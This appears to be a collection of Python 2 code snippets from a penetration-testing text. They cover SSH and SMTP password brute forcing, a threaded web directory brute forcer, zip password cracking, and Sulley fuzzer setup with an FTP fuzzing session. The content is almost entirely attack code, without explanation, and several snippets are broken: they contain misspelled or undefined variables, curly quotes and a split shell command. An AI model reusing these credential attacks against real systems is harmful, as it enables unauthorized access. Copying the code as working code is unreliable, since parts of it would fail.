["```py\nwith open('password-dictionary.txt') as f: \n    for password in f: \n        try: \n                # Use the password to try login \n\n                print \"[+] Password Found: %s\" % password \n                break; \n        except : \n                print \"[!] Password Incorrect: %s\" % password \n\n```", "```py\nimport paramiko, sys, os, socket  \nimport itertools,string,crypt  \n\n```", "```py\nPASS_SIZE = 5 \nIP = \"127.0.0.1\" \nUSER = \"root\" \nPORT=22 \n\nvar = itertools.combinations(string.digits,PASS_SIZE) \n\n```", "```py\ntry: \n    for i in var: \n        passwd = ''.join(i) \n\n        ssh_client = paramiko.SSHClient() \n        ssh_client.load_system_host_keys() \n           ssh_clienth.set_missing_host_key_policy(paramiko.MissingHostKeyPolicy()) \n        try: \n            ssh.connect(IP , port=PORT, username=USER, password=passwd) \n            print \"Password Found= \"+passwd \n            break \n        except paramiko.AuthenticationException, error: \n            print \"Faild Attempt: \"+passwd \n            continue \n        except socket.error, error: \n            print error \n            continue \n        except paramiko.SSHException, error: \n            print error \n            continue \n        except Exception, error: \n            print \"Unknown error: \"+error \n            continue     \n        ssh.close() \n\nexcept Exception,error : \n    print error  \n\n```", "```py\nimport paramiko, sys, os, socket, threading, time  \nimport itertools,string,crypt \n\nPASS_SIZE = 5 \n\ndef bruteforce_list(charset, maxlength): \n    return (''.join(candidate) \n        for candidate in itertools.chain.from_iterable(itertools.product(charset, repeat=i) \n        for i in range(1, maxlength + 1))) \n\ndef attempt(Password): \n\n    IP = \"127.0.0.1\" \n    USER = \"rejah\" \n    PORT=22 \n\n    try: \n\n        ssh = paramiko.SSHClient() \n        ssh.load_system_host_keys() \n        ssh.set_missing_host_key_policy(paramiko.MissingHostKeyPolicy()) \n\n        try: \n            ssh.connect(IP , port=PORT, username=USER, password=Password) \n            print \"Connected successfully. Password = \"+Password \n        except paramiko.AuthenticationException, error: \n            print \"Incorrect password: \"+Password \n            pass \n        except socket.error, error: \n            print error \n            pass \n        except paramiko.SSHException, error: \n            print error \n            print \"Most probably this is caused by a missing host key\" \n            pass \n        except Exception, error: \n            print \"Unknown error: \"+error \n            pass     \n        ssh.close() \n\n    except Exception,error : \n        print error \n\nletters_list = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQSTUVWXYZ1234567890!@#$&()'  \n\n```", "```py\nfor i in bruteforce_list(letters_list, PASS_SIZE): \n    t = threading.Thread(target=attempt, args=(i)) \n    t.start() \n    time.sleep(0.3) \n\nsys.exit(0) \n\n```", "```py\nimport sys, smtplib, socket \nfrom smtplib import SMTP \n\n```", "```py\nIP = \"127.0.0.1\" \nUSER = \"admin\"  \n\n```", "```py\nattackNumber = 1 \nwith open('passwordlist.txt') as f: \n    for PASSWORD in f: \n         try: \n               print \"-\"*12 \n               print \"User:\",USER,\"Password:\",PASSWORD \n               smtp = smtplib.SMTP(IP) \n               smtp.login(user, value) \n               print \"\\t\\nLogin successful:\",user, value \n               smtp.quit() \n               work.join() \n               sys.exit(2) \n         except(socket.gaierror, socket.error, socket.herror,\n         smtplib.SMTPException), msg:  \n               print \"An error occurred:\", msg \n\n```", "```py\nimport urllib \nimport urllib2 \nimport threading \nimport Queue \n\nthreads           = 50     # Be aware that a large number of threads can cause a denial of service!!! \ntarget_url        = \"http://www.example.com\" \nwordlist_file     = \"directory-list.txt\"  \nuser_agent        = \"Mozilla/5.0 (X11; Linux x86_64; rv:19.0) Gecko/20100101 Firefox/19.0\" \n\n```", "```py\ndef wordlist(wordlist_file): \n\n    wordlist_file = open(wordlist_file,\"rb\") \n    raw_words = wordlist_file.readlines() \n    wordlist_file.close() \n\n    words        = Queue.Queue() \n\n    # iterating each word in the word file \n    for word in raw_words:       \n\n        word = word.rstrip() \n        words.put(word) \n\n    return words  \n\n```", "```py\ndef dir_bruteforce(extensions=None): \n\n    while not word_queue.empty(): \n        attempt = word_queue.get() \n\n        attempt_list = [] \n\n        # check for a file extension, if not it's a directory \n        if \".\" not in attempt: \n            attempt_list.append(\"/%s/\" % attempt) \n        else: \n            attempt_list.append(\"/%s\" % attempt) \n\n        # if we want to bruteforce extensions \n        if extensions: \n            for extension in extensions: \n                attempt_list.append(\"/%s%s\" % (attempt,extension)) \n\n        # iterate with list of attempts         \n        for brute in attempt_list: \n\n            url = \"%s%s\" % (target_url,urllib.quote(brute)) \n\n            try: \n                headers = {} \n                headers[\"User-Agent\"] = user_agent \n                r = urllib2.Request(url,headers=headers) \n\n                response = urllib2.urlopen(r) \n\n                if len(response.read()): \n                    print \"[%d] => %s\" % (response.code,url) \n\n            except urllib2.HTTPError,e: \n               # print output If error code is not 404 \n                if e.code != 404: \n                    print \"!!! %d => %s\" % (e.code,url) \n\n                pass \n\nword_queue = wordlist(wordlist_file) \nextensions = [\".php\",\".bak\",\".orig\",\".inc\"]  \n\n```", "```py\nfor i in range(threads): \n            t = threading.Thread(target=dir_bruteforce,args=(extensions,)) \n            t.start() \n\n```", "```py\nimport zipfile \n\nfilename = 'test.zip' \ndictionary = 'passwordlist.txt' \n\npassword = None \nfile_to_open = zipfile.ZipFile(filename) \nwith open(dictionary, 'r') as f: \n   for line in f.readlines(): \n         password = line.strip('\\n') \n         try: \n               file_to_open.extractall(pwd=password) \n               password = 'Password found: %s' % password \n               print password \n         except: \n               pass \n\n```", "```py\n$ apt-get instal\nl python-ctypeslib python-pydot python-wxgtk2.8 python-mysqldb python-pygraphviz\n\n```", "```py\n $ apt-get install mysql-server\n\n```", "```py\n $ python __setup_mysql.py hostname username password\n\n```", "```py\n$ python setup.py build\n$ python setup.py install\n\n```", "```py\n $ apt-get install python-pcapy python-impacket\n\n```", "```py\n $ git clone https://github.com/OpenRCE/sulley.git\n\n```", "```py\n $ cd sulley\n\n```", "```py\n$ sudo python process_monitor.py\n\n```", "```py\n$ python network_monitor.py\n\n```", "```py\n $ python __install_requirements.py\n\n```", "```py\n$ python setup.py build\n$ python setup.py install\n\n```", "```py\n $ pip install pcapy\n\n```", "```py\n $ git clone https://github.com/OpenRCE/sulley.git\n\n```", "```py\ns_int(\"555\", format=\"ascii\", fuzzable=True) \n\n```", "```py\ns_group(\"methods\", values=[\"GET\", \"HEAD\", \"POST\", \"TRACE\"])   \n\n```", "```py\nif s_block_start(\u201cbody\u201d, group=\u201dmethod\u201d)\n s_delim(\"/\")\n s_string(\"index.html\")\n s_delim(\" \")\ns_block_end()\n\n```", "```py\nfrom sulley import * \nimport sulley.primitives \nimport paramiko \n\n```", "```py\nuser = primitives.string(\"user\") \npwd = primitives.string(\"password\") \n\n```", "```py\nclient = paramiko.SSHClient() \nclient.set_missing_host_key_policy(paramiko.AutoAddPolicy()) \n\n```", "```py\nwhile(user.mutate() and pwd.mutate()): \n   username = user.value \n   password = pwd.value \n   try: \n         # Try to connect to the server with the mutated credentials \n         client.connect(\"192.168.1.107\", 22, username, password, timeout=5) \n         client.close() \n   except Exception,e: \n         print \"error! %s\" % e \n\n```", "```py\nfrom sulley import * \nfrom requests import ftp \n\n```", "```py\ndef recv_banner(sock): \n   sock.recv(1024) \n\n```", "```py\nsess = sessions.session(\"ftp_test.session\") \n\n```", "```py\ntarget = sessions.target(\"192.168.1.107\",21) \n\n```", "```py\ntarget.netmon = pedrpc.client(\"192.168.1.107\",26300)  \n\n```", "```py\nsess.add_target(target) \nsess.pre_send(recv_banner) \n\n```", "```py\nsess.connect(s_get(\"user\")) \nsess.connect(s_get(\"user\"),s_get(\"pass\")) \n\n```", "```py\nsess.connect(s_get(\"pass\"),s_get(\"cwd\")) \nsess.connect(s_get(\"pass\"),s_get(\"mkd\")) \nsess.connect(s_get(\"pass\"),s_get(\"rmd\")) \nsess.connect(s_get(\"pass\"),s_get(\"list\")) \nsess.connect(s_get(\"pass\"),s_get(\"delete\")) \nsess.connect(s_get(\"pass\"),s_get(\"port\"))  \n\n```", "```py\nsess.fuzz()  \n\n```"]